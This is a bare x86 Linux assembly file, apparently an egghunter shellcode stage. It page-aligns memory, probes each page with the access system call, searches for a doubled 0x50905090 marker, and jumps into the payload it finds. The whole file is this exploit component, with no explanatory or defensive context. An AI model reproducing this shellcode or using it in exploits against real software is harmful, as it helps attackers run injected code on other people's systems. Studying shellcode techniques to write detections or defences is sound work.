global _start

section .text

_start:

	mov ebx, 0x50905090
	xor ecx,ecx
	mul ecx

pgalgn:

	or dx, 0xfff

next:

	inc edx
	
	pusha

	lea ebx, [edx+0x4]
	mov al, 0x21
	int 0x80

	cmp al, 0xf2	
	
	popa

	jz pgalgn

	cmp [edx], ebx

	jnz next

	cmp [edx+0x4], ebx

	jnz next

	jmp edx
